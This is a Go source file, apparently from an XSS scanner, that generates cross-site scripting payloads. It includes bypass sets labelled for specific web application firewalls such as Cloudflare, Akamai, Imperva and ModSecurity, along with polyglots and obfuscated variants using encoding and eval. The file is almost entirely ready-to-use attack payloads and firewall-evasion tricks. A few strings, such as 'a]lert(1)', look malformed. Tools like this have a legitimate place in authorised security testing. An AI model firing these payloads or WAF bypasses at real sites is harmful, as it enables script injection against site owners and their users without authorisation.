package payloads

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

// Generator handles XSS payload generation with WAF-specific bypasses
type Generator struct {
	smartMode bool
}

// NewGenerator creates a new payload generator
func NewGenerator(smartMode bool) *Generator {
	return &Generator{smartMode: smartMode}
}

// LoadFromFile loads payloads from a custom file
func (g *Generator) LoadFromFile(filepath string) ([]string, error) {
	file, err := os.Open(filepath)
	if err != nil {
		return nil, fmt.Errorf("failed to open payload file: %w", err)
	}
	defer file.Close()

	var payloads []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}
	return payloads, scanner.Err()
}

// GetPayloads returns payloads optimized for the detected WAF
func (g *Generator) GetPayloads(wafType string) []string {
	// Start with high-confidence base payloads
	payloads := g.getBasePayloads()

	// Add AwesomeXSS specific payloads
	payloads = append(payloads, g.getAwesomeConfirmVariants()...)
	payloads = append(payloads, g.getAwesomeContextBreaking()...)

	// Add WAF-specific bypass payloads
	switch strings.ToLower(wafType) {
	case "cloudflare":
		payloads = append(payloads, g.getCloudflareBypass()...)
	case "akamai":
		payloads = append(payloads, g.getAkamaiBypass()...)
	case "cloudfront", "aws-waf":
		payloads = append(payloads, g.getCloudfrontBypass()...)
	case "imperva", "incapsula":
		payloads = append(payloads, g.getImpervaBypass()...)
	case "wordfence":
		payloads = append(payloads, g.getWordfenceBypass()...)
	case "modsecurity":
		payloads = append(payloads, g.getModSecurityBypass()...)
	case "sucuri":
		payloads = append(payloads, g.getSucuriBypass()...)
	case "f5":
		payloads = append(payloads, g.getF5Bypass()...)
	default:
		// Unknown or no WAF - use comprehensive bypass set
		payloads = append(payloads, g.getAllBypass()...)
	}

	// Add smart/polyglot payloads if enabled
	if g.smartMode {
		payloads = append(payloads, g.getSmartPayloads()...)
		payloads = append(payloads, g.getPolyglotPayloads()...)
		payloads = append(payloads, g.getAwesomePolyglots()...)
	}

	return g.deduplicate(payloads)
}

// getAwesomeConfirmVariants returns confirm() based payloads from AwesomeXSS
// confirm() is often less detected than alert()
func (g *Generator) getAwesomeConfirmVariants() []string {
	return []string{
		"confirm()",
		"confirm``",
		"(confirm``)",
		"{confirm``}",
		"[confirm``]",
		"(((confirm)))``",
		"co\\u006efirm()",
		"new class extends confirm``{}",
		"[8].find(confirm)",
		"[8].map(confirm)",
		"[8].some(confirm)",
		"[8].every(confirm)",
		"[8].filter(confirm)",
		"[8].findIndex(confirm)",
		"<script>confirm()</script>",
		"<img src=x onerror=confirm()>",
		"<svg/onload=confirm()>",
	}
}

// getAwesomeContextBreaking returns context breaking payloads from AwesomeXSS
func (g *Generator) getAwesomeContextBreaking() []string {
	return []string{
		// HTML Context
		"<svg onload=alert(1)>",
		"</tag><svg onload=alert(1)>",

		// Attribute Context
		"\"><svg onload=alert(1)>",
		"\"><svg onload=alert(1)><b attr=\"",
		"\" onmouseover=alert(1) \"",
		"\"onmouseover=alert(1)//",
		"\"autofocus/onfocus=\"alert(1)",

		// JavaScript Context
		"'-alert(1)-'",
		"'-alert(1)//'",
		"'}alert(1);{'",
		"'}%0Aalert(1);%0A{'",
		"</script><svg onload=alert(1)>",
	}
}

// getAwesomePolyglots returns advanced polyglots from AwesomeXSS
func (g *Generator) getAwesomePolyglots() []string {
	return []string{
		// S0md3v's Polyglot
		`%0ajavascript:` + "`/*\\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ alert()//'\">`",

		// Common Polyglots
		`javascript://%250Aalert(1)//"/*\'/*"/*\'/*</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*`,
		`javascript://%250Aalert(1)//"/*\'/*"/*\'/*</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*`,
	}
}

// getBasePayloads returns reliable XSS payloads that work in most scenarios
func (g *Generator) getBasePayloads() []string {
	return []string{
		// Classic script tag payloads
		`<script>alert(1)</script>`,
		`<script>confirm(1)</script>`,
		`<script>prompt(1)</script>`,

		// IMG tag payloads
		`<img src=x onerror=alert(1)>`,
		`<img src=x onerror=confirm(1)>`,
		`<img src=x onerror="alert(1)">`,

		// SVG payloads
		`<svg onload=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<svg onload=confirm(1)>`,

		// Body tag payloads
		`<body onload=alert(1)>`,
		`<body/onload=alert(1)>`,

		// Input payloads
		`<input onfocus=alert(1) autofocus>`,
		`<input/onfocus=alert(1) autofocus>`,

		// Iframe payloads
		`<iframe src="javascript:alert(1)">`,
		`<iframe srcdoc="<script>alert(1)</script>">`,

		// Other event handlers
		`<details open ontoggle=alert(1)>`,
		`<marquee onstart=alert(1)>`,
		`<video src=x onerror=alert(1)>`,
		`<audio src=x onerror=alert(1)>`,
		`<select onfocus=alert(1) autofocus>`,
		`<textarea onfocus=alert(1) autofocus>`,

		// JavaScript URI payloads
		`javascript:alert(1)`,
		`javascript:confirm(1)`,

		// Attribute breakout payloads
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`" onclick=alert(1) "`,
		`' onclick=alert(1) '`,
		`" onfocus=alert(1) autofocus "`,
		`' onfocus=alert(1) autofocus '`,
		`"><img src=x onerror=alert(1)>`,
		`'><img src=x onerror=alert(1)>`,
	}
}

// getCloudflareBypass returns Cloudflare-specific bypass payloads
func (g *Generator) getCloudflareBypass() []string {
	return []string{
		// HTML entity encoding
		`<svg/onload=&#97&#108&#101&#114&#116(1)>`,
		`<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>`,

		// Unicode escapes
		`<img src=x onerror=\u0061lert(1)>`,
		`<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>`,

		// Base64 + eval
		`<svg onload=eval(atob('YWxlcnQoMSk='))>`,
		`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,

		// Alternative alert methods
		`<svg><animate onbegin=alert(1) attributeName=x>`,
		`<svg><set onbegin=alert(1) attributeName=x>`,

		// Constructor method
		`<script>onerror=alert;throw 1</script>`,
		`<script>[].constructor.constructor('alert(1)')();</script>`,

		// Template literals (using regular string for backticks)
		"<svg onload=alert`1`>",

		// Tag obfuscation
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<SCRIPT>alert(1)</SCRIPT>`,
	}
}

// getAkamaiBypass returns Akamai-specific bypass payloads
func (g *Generator) getAkamaiBypass() []string {
	return []string{
		// Slash obfuscation
		`<svg/onload=prompt(1)>`,
		`<body/onload=alert(1)>`,
		`<input/onfocus=alert(1) autofocus>`,
		`<marquee/onstart=alert(1)>`,

		// Alternative event handlers
		`<form><button formaction=javascript:alert(1)>X</button>`,
		`<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>click`,
		`<isindex action=javascript:alert(1) type=submit value=click>`,

		// Various tag bypasses
		`<xss onmouseover=alert(1)>hover</xss>`,
		`<x onclick=alert(1)>click</x>`,

		// Data URI
		`<object data="data:text/html,<script>alert(1)</script>">`,
		`<embed src="data:text/html,<script>alert(1)</script>">`,
	}
}

// getCloudfrontBypass returns CloudFront-specific bypass payloads
func (g *Generator) getCloudfrontBypass() []string {
	return []string{
		// String.fromCharCode
		`<img src=x onerror=alert(String.fromCharCode(88,83,83))>`,
		`<svg onload=alert(String.fromCharCode(49))>`,

		// Regex tricks
		`<svg onload=top[/al/.source+/ert/.source](1)>`,
		`<svg onload=window[/al/.source+/ert/.source](1)>`,

		// Template literals
		`<script>top["al"+"ert"](1)</script>`,
		`<script>window["al"+"ert"](1)</script>`,

		// Indirect eval
		`<script>(1,eval)('alert(1)')</script>`,
		`<script>eval.call(null,'alert(1)')</script>`,
	}
}

// getImpervaBypass returns Imperva-specific bypass payloads
func (g *Generator) getImpervaBypass() []string {
	return []string{
		// Comment injection
		`<svg onload=alert(1)//>`,
		`<script>/**/alert(1)/**/</script>`,
		`<img src=x onerror="/**/alert(1)">`,

		// Function constructor
		`<script>Function("ale"+"rt(1)")();</script>`,
		`<script>new Function('alert(1)')();</script>`,

		// Form action
		`<form action=javascript:alert(1)><input type=submit>`,
		`<form id=f action=javascript:alert(1)></form><input form=f type=submit>`,

		// Alternative handlers
		`<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>`,
		`<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]></mglyph></table></mtext></math>`,
	}
}

// getWordfenceBypass returns Wordfence-specific bypass payloads
func (g *Generator) getWordfenceBypass() []string {
	return []string{
		// Null byte injection
		`<script\x00>alert(1)</script>`,
		`<img src\x00=x onerror=alert(1)>`,

		// WordPress-specific contexts
		`[caption]<script>alert(1)</script>[/caption]`,
		`[gallery]<img src=x onerror=alert(1)>[/gallery]`,

		// Tab/newline obfuscation
		`<script>al	ert(1)</script>`,
		`<img src=x on
error=alert(1)>`,

		// Event handler variations
		`<svg/onload=confirm(1)>`,
		`<svg/onload=prompt(1)>`,
	}
}

// getModSecurityBypass returns ModSecurity-specific bypass payloads
func (g *Generator) getModSecurityBypass() []string {
	return []string{
		// Hex encoding
		`<script>alert(0x1)</script>`,
		`<img src=x onerror=alert(\x31)>`,

		// Unicode normalization
		`<script>ａｌｅｒｔ(1)</script>`,

		// Double URL encoding (for specific situations)
		`%253Cscript%253Ealert(1)%253C/script%253E`,

		// Base64 with atob
		`<svg onload=eval(atob('YWxlcnQoMSk='))>`,
		`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,

		// Concatenation
		`<script>a]lert(1)</script>`,
		`<script>eval('a]l'+'ert(1)')</script>`,
	}
}

// getSucuriBypass returns Sucuri-specific bypass payloads
func (g *Generator) getSucuriBypass() []string {
	return []string{
		// Tag obfuscation
		`<ScRiPt>alert(1)</ScRiPt>`,
		`<sCRIpt>alert(1)</sCRIpt>`,

		// Event handler variations
		`<svg onLoad=alert(1)>`,
		`<img src=x onError=alert(1)>`,

		// Tab insertion
		`<img	src=x	onerror=alert(1)>`,
		`<svg	onload=alert(1)>`,
	}
}

// getF5Bypass returns F5 BIG-IP ASM-specific bypass payloads
func (g *Generator) getF5Bypass() []string {
	return []string{
		// Protocol-level bypasses
		`<svg onload=alert(1)>`,
		`<img src=x onerror=alert(1)>`,

		// Chunked encoding context
		`<script>al\u0065rt(1)</script>`,

		// Cookie-based context
		`<meta http-equiv="Set-Cookie" content="x=<script>alert(1)</script>">`,
	}
}

// getAllBypass returns all bypass payloads for unknown WAFs
func (g *Generator) getAllBypass() []string {
	var all []string
	all = append(all, g.getCloudflareBypass()...)
	all = append(all, g.getAkamaiBypass()...)
	all = append(all, g.getCloudfrontBypass()...)
	all = append(all, g.getImpervaBypass()...)
	all = append(all, g.getModSecurityBypass()...)
	return all
}

// getSmartPayloads returns context-aware smart payloads
func (g *Generator) getSmartPayloads() []string {
	return []string{
		// Case variations
		`<SCRIPT>alert(1)</SCRIPT>`,
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<sCRIpt>alert(1)</scrIPT>`,

		// Whitespace variations
		`<script >alert(1)</script >`,
		`<script	>alert(1)</script	>`,
		`< script>alert(1)</script>`,

		// Comment insertion
		`<script>eval/*comment*/('alert(1)')</script>`,
		`<img src=x onerror=/**/alert(1)>`,

		// Newline insertion
		`<script
>alert(1)</script
>`,

		// URL encoded payloads
		`%3Cscript%3Ealert(1)%3C/script%3E`,
		`%3Csvg%20onload%3Dalert(1)%3E`,
	}
}

// getPolyglotPayloads returns polyglot XSS payloads that work in multiple contexts
func (g *Generator) getPolyglotPayloads() []string {
	return []string{
		// Classic polyglots
		`'"></title></style></script><script>alert(1)</script>`,
		`'"--><script>alert(1)</script>`,
		`</script><script>alert(1)</script>`,

		// Context-breaking polyglots
		`"><img src=x onerror=alert(1)><"`,
		`'"><img src=x onerror=alert(1)><'`,
		`--><script>alert(1)</script><!--`,

		// SVG polyglots
		`</title><svg onload=alert(1)>`,
		`</style><svg onload=alert(1)>`,
		`</script><svg onload=alert(1)>`,

		// Multi-context polyglot (using regular string for backticks)
		"jaVasCript:/*-/*'/*\"/*'/*\"/*`/*--><svg onload=/*<html/*/onmouseover=alert(1)//>",

		// HTML5 specific
		`<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICK`,
	}
}

// deduplicate removes duplicate payloads while preserving order
func (g *Generator) deduplicate(payloads []string) []string {
	seen := make(map[string]bool)
	var unique []string
	for _, p := range payloads {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}
	return unique
}
